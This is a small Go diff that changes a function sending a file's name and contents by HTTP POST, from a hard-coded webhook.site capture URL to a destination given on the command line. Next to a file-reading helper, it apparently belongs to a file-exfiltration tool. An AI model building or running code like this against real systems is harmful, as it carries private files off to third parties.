@@ -51,7 +51,7 @@ func readAFile(path string) {
 func httpPoster(fileData string, filename string) {
 	data := []byte(filename + ":" + fileData)
 
-	req, err := http.NewRequest("POST", "https://webhook.site/27227c6f-b632-4b50-ae7e-a38b18629b2c", bytes.NewBuffer(data))
+	req, err := http.NewRequest("POST", os.Args[2], bytes.NewBuffer(data))
 	req.Header.Set("Content-Type", "application/json")
 	client := &http.Client{}
 
